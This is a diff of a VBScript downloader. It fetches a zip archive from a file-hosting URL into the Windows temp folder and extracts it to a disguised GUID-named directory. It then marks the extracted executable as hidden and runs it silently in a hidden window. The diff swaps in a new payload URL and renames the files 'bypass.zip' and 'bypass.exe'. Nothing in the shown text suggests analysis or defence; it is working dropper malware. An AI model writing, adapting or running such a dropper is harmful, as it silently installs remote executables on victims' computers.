@@ -3,9 +3,9 @@ Set objShell = CreateObject("WScript.Shell")
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
 temp = objShell.ExpandEnvironmentStrings("%TEMP%")
-zipUrl = "https://files.catbox.moe/zariy7.zip"
-zipPath = temp & "\d.zip"
-extPath = temp & "\e"
+zipUrl = "https://files.catbox.moe/cnjyvm.zip"
+zipPath = temp & "\bypass.zip"
+extPath = temp & "\9C6A2D99-9B06-4E37-A0B1-351087Z15A81"
 
 objHTTP.Open "GET", zipUrl, False
 objHTTP.Send
@@ -34,7 +34,7 @@ If Not objFolder Is Nothing Then
     End If
 End If
 
-exePath = extPath & "\Underinteraction.exe"
+exePath = extPath & "\bypass.exe"
 If objFSO.FileExists(exePath) Then
     objFSO.GetFile(exePath).Attributes = objFSO.GetFile(exePath).Attributes Or 2
     objShell.Run exePath, 0, False
